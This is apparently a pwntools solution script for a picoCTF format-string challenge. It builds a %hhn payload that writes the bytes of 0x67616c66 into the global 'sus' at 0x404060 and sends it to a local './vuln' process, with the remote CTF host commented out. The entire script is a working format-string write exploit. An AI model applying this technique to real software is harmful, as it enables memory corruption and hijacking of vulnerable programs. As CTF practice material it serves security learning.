from pwn import *

# pr = remote('rhea.picoctf.net',55003)
pr = process('./vuln')

context.update(arch='amd64', os='linux')

# p &sus
# $1 = (<data variable, no debug info> *) 0x404060 <sus>

sus_addr = 0x404060
val = 0x67616c66
offset = 20     # (48 / 8) + 14

def split_and_sort_with_indices(val):
    # Split the value into 1-byte chunks with their original indices
    bytes_with_indices = [(i, (val >> (8 * i)) & 0xFF) for i in range(4)]
    # Sort the chunks by their values in ascending order
    return sorted(bytes_with_indices, key=lambda x: x[1])

val_sorted_with_indices = [(hex(value), index) for index, value in split_and_sort_with_indices(val)]
print(val_sorted_with_indices)

# Function to calculate the difference between two values modulo 256
diff_hhn = lambda i, j: ((i - j) % 256) # (0xFF+1)

def create_payload(val, sus_addr, offset):
    payload = b""
    sorted_bytes = split_and_sort_with_indices(val)
    prev_value = 0

    for index, value in sorted_bytes:
        diff = diff_hhn(value, prev_value)
        payload += f"%{diff}c%{offset + index}$hhn".encode()
        prev_value = value

    return payload

payload1 = create_payload(val, sus_addr, offset)
payload1 += b"A" * (8 - (len(payload1) % 8))  # Padding to align to 8 bytes

payload2 = p64(sus_addr)
payload2 += p64(sus_addr+1)
payload2 += p64(sus_addr+2)
payload2 += p64(sus_addr+3)

print(len(payload1))
print(payload1 )

pr.sendline(payload1+payload2)

# payload = fmtstr_payload(14, {sus_addr: val})
# pr.sendline(payload)

pr.interactive()

